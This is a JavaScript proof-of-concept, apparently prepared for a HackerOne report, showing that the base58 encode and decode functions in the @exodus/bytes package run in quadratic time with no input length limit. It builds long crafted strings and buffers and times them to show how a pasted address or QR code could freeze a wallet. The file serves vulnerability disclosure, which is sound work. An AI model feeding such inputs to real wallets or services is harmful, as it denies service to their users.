// PoC: Uncontrolled algorithmic complexity (O(n^2)) in @exodus/bytes base58
//
// Affected package: @exodus/bytes  (HackerOne scope: ExodusOSS/bytes)
// Affected module:  base58.js  -> exports toBase58, fromBase58, toBase58xrp, fromBase58xrp
// Transitively:     base58check.js (toBase58check/fromBase58check) and wif.js (to/fromWifString)
//
// Both encode (toBase58core) and decode (fromBase58core) run in O(n^2) time and
// impose NO maximum input length. A single crafted string / buffer of ~1 MB
// blocks the single JavaScript thread (and the wallet UI) for minutes.
//
// These are exactly the functions a wallet uses to parse UNTRUSTED input:
//   - fromBase58 / fromBase58check: recipient addresses (pasted or scanned from a QR),
//     xpubs, and WIF private keys entered on the "import wallet" screen.
//   - toBase58: encoding attacker-influenced byte blobs for display.
//
// Run:
//   npm i @exodus/bytes
//   node poc_base58_dos.mjs
//
// Expected: decode/encode time grows ~4x for every 2x of input length (quadratic),
// with a 256k-char decode taking ~20s and a 128kB encode taking ~14s on a modern
// desktop V8. On a phone (Hermes) the bigint path is likewise O(n^2).

import { fromBase58, toBase58 } from '@exodus/bytes/base58.js'

const time = (fn) => {
  const t0 = process.hrtime.bigint()
  const r = fn()
  const t1 = process.hrtime.bigint()
  return { ms: Number(t1 - t0) / 1e6, r }
}

console.log('=== fromBase58 (untrusted decode: address / WIF / xpub) ===')
console.log('input_chars\tdecode_ms')
for (const n of [8000, 16000, 32000, 64000, 128000, 256000]) {
  const s = 'z'.repeat(n) // all valid base58 chars, no leading-zero shortcut
  const { ms, r } = time(() => fromBase58(s))
  console.log(`${n}\t${ms.toFixed(1)}\t(-> ${r.length} bytes)`)
}

console.log('\n=== toBase58 (encode an attacker-influenced blob) ===')
console.log('input_bytes\tencode_ms')
for (const n of [8000, 16000, 32000, 64000, 128000]) {
  const buf = new Uint8Array(n).fill(0xff)
  const { ms } = time(() => toBase58(buf))
  console.log(`${n}\t${ms.toFixed(1)}`)
}

console.log('\nNote: there is no length ceiling. A ~1 MB input scales to minutes of')
console.log('fully-blocked event loop (quadratic). A malicious QR / pasted address /')
console.log('dApp-supplied address is enough to freeze the wallet.')
